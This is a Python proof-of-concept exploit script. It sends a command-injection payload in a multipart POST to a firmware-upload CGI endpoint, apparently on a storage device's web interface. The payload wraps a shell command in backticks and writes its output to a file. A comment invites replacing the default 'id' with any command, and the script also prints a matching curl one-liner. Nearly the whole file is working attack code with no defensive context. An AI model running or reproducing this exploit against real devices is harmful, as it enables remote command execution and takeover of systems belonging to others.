#!/usr/bin/env python3

import requests

# Request configuration variables
base_url = "http://0.0.0.0:8081"
endpoint = "/cgi-bin/quick/quick.cgi"
url = f"{base_url}{endpoint}"

# Query parameters
query_params = {
    "func": "switch_os",
    "todo": "uploaf_firmware_image"
}

# Headers configuration
content_type = "multipart/form-data"
user_agent = "Python-Script/1.0"
headers = {
    "Content-Type": content_type,
    "User-Agent": user_agent,
}

# Command injection payload (set as variable for easy modification)
command = "id"  # Change this to your desired command
payload_data = f'.\r\n;;"`{command}>pwn`"\r\n\r\n.\r\n'.encode()

# Additional request parameters
timeout = 30
verify_ssl = False

def make_post_request():
    """Make a POST request equivalent to the curl command"""
    try:
        print(f"Making POST request to: {url}")
        print(f"Query params: {query_params}")
        print(f"Headers: {headers}")
        print(f"Command being injected: {command}")
        print(f"Payload (hex): {payload_data.hex()}")
        
        response = requests.post(
            url=url,
            params=query_params,
            headers=headers,
            data=payload_data,  # Send raw binary data
            verify=verify_ssl,
            timeout=timeout,
            allow_redirects=True
        )
        
        print(f"\nResponse Status Code: {response.status_code}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Text: {response.text}")
            
        return response
        
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def show_curl_equivalent():
    """Show the equivalent curl command"""
    payload_str = payload_data.decode('utf-8', errors='replace')
    print("Equivalent curl command:")
    print(f'curl -v "{base_url}{endpoint}?func={query_params["func"]}&todo={query_params["todo"]}" \\')
    print(f"  -H 'Content-Type: {content_type}' \\")
    print(f"  --data-binary $'{payload_str.encode('unicode_escape').decode()}'")
    print()

if __name__ == "__main__":
    show_curl_equivalent()
    make_post_request()
